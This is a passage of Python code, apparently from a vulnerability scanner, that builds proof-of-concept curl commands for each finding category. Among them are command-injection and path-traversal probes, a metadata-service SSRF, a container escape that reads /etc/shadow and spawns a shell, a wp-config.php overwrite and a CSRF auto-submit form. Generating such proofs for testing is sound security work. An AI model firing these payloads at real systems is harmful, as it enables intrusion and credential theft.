                    f"quit\n"
                    f"EOF"
                )
            return (
                f"{note_str}{self._template('poc.credentials.default_header', vulnerability_id=vulnerability_id)}"
                f'curl -i -s -X POST "http://<TARGET_HOST>/login" \\\n'
                f'  -H "Content-Type: application/json" \\\n'
                f'  -d \'{{"username": "admin", "password": "admin"}}\''
            )
        if category == "COMMAND_INJECTION":
            cmd_payload = "test; id; whoami"
            blind_payload = "test; sleep 5"
            auth_header = ""
            if artifacts.get("is_authenticated"):
                role_tok = f"<{artifacts.get('auth_role', 'admin').upper()}_TOKEN>"
                auth_header = f'  -H "Authorization: Bearer {role_tok}" \\\n'

            if method in ("POST", "PUT", "PATCH"):
                if ctype == "application/json" or "/api" in ep:
                    body_str = f'{{"{p}": "{cmd_payload}"}}'
                    body_blind = f'{{"{p}": "{blind_payload}"}}'
                    return (
                        f"{note_str}"
                        f"{self._template('poc.command.json_inband', vulnerability_id=vulnerability_id)}"
                        f'curl -i -s -X {method} "http://<TARGET_HOST>{ep}" \\\n'
                        f'  -H "Content-Type: application/json" \\\n'
                        f"{auth_header}"
                        f"  -d '{body_str}'\n\n"
                        f"{self._template('poc.command.json_blind')}"
                        f'curl -i -s -w "\\n{timing_note}\\n" -X {method} "http://<TARGET_HOST>{ep}" \\\n'
                        f'  -H "Content-Type: application/json" \\\n'
                        f"{auth_header}"
                        f"  -d '{body_blind}'"
                    )
                body_blind = f"{p}={blind_payload}"
                return (
                    f"{note_str}"
                    f"{self._template('poc.command.form_inband', vulnerability_id=vulnerability_id)}"
                    f'curl -i -s -X {method} "http://<TARGET_HOST>{ep}" \\\n'
                    f'  -H "Content-Type: {ctype}" \\\n'
                    f"{auth_header}"
                    f'  -d "{p}={cmd_payload}"\n\n'
                    f"{self._template('poc.command.form_blind')}"
                    f'curl -i -s -w "\\n{timing_note}\\n" -X {method} "http://<TARGET_HOST>{ep}" \\\n'
                    f'  -H "Content-Type: {ctype}" \\\n'
                    f"{auth_header}"
                    f'  -d "{body_blind}"'
                )
            auth_part = f"{auth_header}" if auth_header else ""
            if auth_part:
                return (
                    f"{note_str}"
                    f"{self._template('poc.command.get_auth_inband', vulnerability_id=vulnerability_id)}"
                    f'curl -i -s -X GET "http://<TARGET_HOST>{ep}{sep}{p}=test%3Bid%3Bwhoami" \\\n'
                    f"{auth_part.rstrip(' \\\n')}\n\n"
                    f"{self._template('poc.command.get_auth_blind')}"
                    f'curl -i -s -w "\\n{timing_note}\\n" -X GET "http://<TARGET_HOST>{ep}{sep}{p}=test%3Bsleep%205" \\\n'
                    f"{auth_part.rstrip(' \\\n')}"
                )
            return (
                f"{note_str}"
                f"{self._template('poc.command.get_inband', vulnerability_id=vulnerability_id)}"
                f'curl -i -s -X GET "http://<TARGET_HOST>{ep}{sep}{p}=test%3Bid%3Bwhoami"\n\n'
                f"{self._template('poc.command.get_blind')}"
                f'curl -i -s -w "\\n{timing_note}\\n" -X GET "http://<TARGET_HOST>{ep}{sep}{p}=test%3Bsleep%205"'
            )
        if category == "PATH_TRAVERSAL":
            return (
                f"{note_str}{self._template('poc.path_traversal.header', vulnerability_id=vulnerability_id)}"
                f'curl -i -s -X GET "http://<TARGET_HOST>{ep}{sep}{p}=../../../../../../etc/passwd"'
            )
        if category == "FILE_UPLOAD":
            auth_cookie = ""
            if artifacts.get("is_authenticated"):
                role_tag = f"_{artifacts.get('auth_role').upper()}" if artifacts.get("auth_role") else ""
                auth_cookie = f'  -b "wordpress_logged_in_cookie=<VALID_SESSION_COOKIE{role_tag}>" \\\n'

            if comp.get("kind") == "FILE_OVERWRITE":
                return (
                    f"{note_str}{self._template('poc.file_upload.overwrite_header', vulnerability_id=vulnerability_id, parameter=p)}"
                    f'curl -i -s -X POST "http://<TARGET_HOST>{ep}" \\\n'
                    f"{auth_cookie}"
                    f'  -d "{p}=../../../../wp-config.php&content=//test_overwrite"'
                )
            if method == "POST" and comp.get("content_type") == "multipart/form-data":
                return (
                    f"{note_str}{self._template('poc.file_upload.multipart_header', vulnerability_id=vulnerability_id)}"
                    f'curl -i -s -X POST "http://<TARGET_HOST>{ep}" \\\n'
                    f"{auth_cookie}"
                    f'  -F "{p}=/var/www/html/test_overwrite.txt" \\\n'
                    f'  -F "file=@payload.txt"'
                )
            return (
                f"{note_str}{self._template('poc.file_upload.default_header', vulnerability_id=vulnerability_id)}"
                f'curl -i -s -X {method} "http://<TARGET_HOST>{ep}{sep}{p}=../../test_overwrite.txt"'
            )
        if category == "XSS":
            if method == "POST":
                return (
                    f"{note_str}{self._template('poc.xss.post_header', vulnerability_id=vulnerability_id)}"
                    f'curl -i -s -X POST "http://<TARGET_HOST>{ep}" \\\n'
                    f'  -H "Content-Type: {ctype}" \\\n'
                    f'  -d \'{{"{p}": "<script>alert(document.domain)</script>"}}\''
                )
            return (
                f"{note_str}{self._template('poc.xss.get_header', vulnerability_id=vulnerability_id)}"
                f'curl -i -s -X GET "http://<TARGET_HOST>{ep}{sep}{p}=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E"'
            )
        if category == "SSRF":
            return (
                f"{note_str}{self._template('poc.ssrf.header', vulnerability_id=vulnerability_id)}"
                f'curl -i -s -X GET "http://<TARGET_HOST>{ep}{sep}{p}=http://169.254.169.254/latest/meta-data/"'
            )
        if category == "CONTAINER_ESCAPE":
            return (
                f"{note_str}{self._template('poc.container_escape.body', vulnerability_id=vulnerability_id)}"
                f"ls -la /proc/self/fd/\n\n"
                f"{self._template('poc.container_escape.step_two')}"
                f"cat /proc/self/fd/7/etc/shadow || cat /proc/self/fd/8/etc/shadow\n\n"
                f"{self._template('poc.container_escape.step_three')}"
                f"/proc/self/fd/7/bin/sh"
            )
        if category == "ACCESS_CONTROL":
            return (
                f"{note_str}{self._template('poc.access_control.header', vulnerability_id=vulnerability_id)}"
                f"{self._template('poc.access_control.step_one')}"
                f'curl -i -s -X {method} "http://<TARGET_HOST>{ep}{sep}{p}=1001" \\\n'
                f'  -H "Authorization: Bearer <USER_SESSION_TOKEN>"\n\n'
                f"{self._template('poc.access_control.step_two', parameter=p)}"
                f'curl -i -s -X {method} "http://<TARGET_HOST>{ep}{sep}{p}=1002" \\\n'
                f'  -H "Authorization: Bearer <USER_SESSION_TOKEN>"'
            )
        if category == "AUTHENTICATION_BYPASS":
            return (
                f"{note_str}{self._template('poc.authentication_bypass.header', vulnerability_id=vulnerability_id)}"
                f'curl -i -s -X {method} "http://<TARGET_HOST>{ep}{sep}{p}=1&DontCheckLogin=1" \\\n'
                f'  -H "X-Custom-Auth: bypass"'
            )
        if category == "CSRF":
            return (
                f"{note_str}{self._template('poc.csrf.header', vulnerability_id=vulnerability_id)}"
                f"<!DOCTYPE html>\n"
                f"<html>\n"
                f"<body>\n"
                f"  <h2>CSRF Demonstration PoC</h2>\n"
                f'  <form id="csrfForm" action="http://<TARGET_HOST>{ep}" method="{method}">\n'
                f'    <input type="hidden" name="{p}" value="unauthorized_state_change" />\n'
                f"  </form>\n"
                f"  <script>\n"
                f"    document.getElementById('csrfForm').submit();\n"
                f"  </script>\n"
                f"</body>\n"
                f"</html>"
            )
        if category == "SSTI":
            return (
                f"{note_str}{self._template('poc.ssti.header', vulnerability_id=vulnerability_id)}"
                f"{self._template('poc.ssti.standard')}"
                f'curl -i -s -X {method} "http://<TARGET_HOST>{ep}{sep}{p}=%24%7B7*7%7D"\n\n'
                f"{self._template('poc.ssti.alternate')}"
                f'curl -i -s -X {method} "http://<TARGET_HOST>{ep}{sep}{p}=%7B%7B7*7%7D%7D"'
            )
        if category == "DESERIALIZATION":
            return (
                f"{note_str}{self._template('poc.deserialization.header', vulnerability_id=vulnerability_id)}"
                f'curl -i -s -X POST "http://<TARGET_HOST>{ep}" \\\n'
                f'  -H "Content-Type: {ctype}" \\\n'
                f'  -d \'{{"{p}": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sBFlCheck..."}}\''
            )
        if category == "INFO_DISCLOSURE":
            return (
                f"{note_str}{self._template('poc.info_disclosure.header', vulnerability_id=vulnerability_id)}"
                f'curl -i -s -X {method} "http://<TARGET_HOST>{ep}{sep}{p}=debug_mode"'
            )
        if category == "CRYPTOGRAPHIC_FAILURES":
            return (
                f"{note_str}{self._template('poc.cryptographic_failures.header', vulnerability_id=vulnerability_id)}"
                f'curl -i -s -v --tlsv1.0 --tls-max 1.0 "http://<TARGET_HOST>{ep}"'
            )
        if category == "MEMORY_CORRUPTION":
            return (
                f"{note_str}{self._template('poc.memory_corruption.header', vulnerability_id=vulnerability_id)}"
                f'python3 -c "import urllib.parse, sys; sys.stdout.write(urllib.parse.quote(\'A\' * 4096))" | \\\n'
                f'  xargs -I {{}} curl -i -s -X {method} "http://<TARGET_HOST>{ep}{sep}{p}={{}}"'
            )
        if category == "DOS_RESOURCE_EXHAUSTION":
            if "jwk" in ep.lower() or "key_ops" in p or "jwcrypto" in vulnerability_id.lower() or "key" in p:
                return (
                    f"{note_str}{self._template('poc.dos.algorithmic_header', parameter=p, vulnerability_id=vulnerability_id)}"
                    f"{self._template('poc.dos.algorithmic_payload', parameter=p)}"
                    f"python3 -c \"import json; print(json.dumps({{'kty':'EC', '{p}': ['verify']*15000}}))\" > payload_{p}_dos.json\n\n"
                    f"{self._template('poc.dos.algorithmic_send')}"
                    f'curl -i -s -X POST "http://<TARGET_HOST>{ep}" \\\n'
                    f'  -H "Content-Type: application/json" \\\n'
                    f'  --data-binary @payload_{p}_dos.json'
                )
            return (
                f"{note_str}{self._template('poc.dos.resource_header', vulnerability_id=vulnerability_id)}"
                f"{self._template('poc.dos.resource_payload', parameter=p)}"
                f'curl -i -s -X {method} "http://<TARGET_HOST>{ep}" \\\n'
                f'  -H "Content-Type: {ctype}" \\\n'
                f'  -d \'{{"{p}": ["test"] * 10000}}\''
            )
        return (
            f"{note_str}{self._template('poc.default.header', vulnerability_id=vulnerability_id)}"
            f'curl -i -s -X GET "http://<TARGET_HOST>{ep}{sep}{p}=test"'
        )
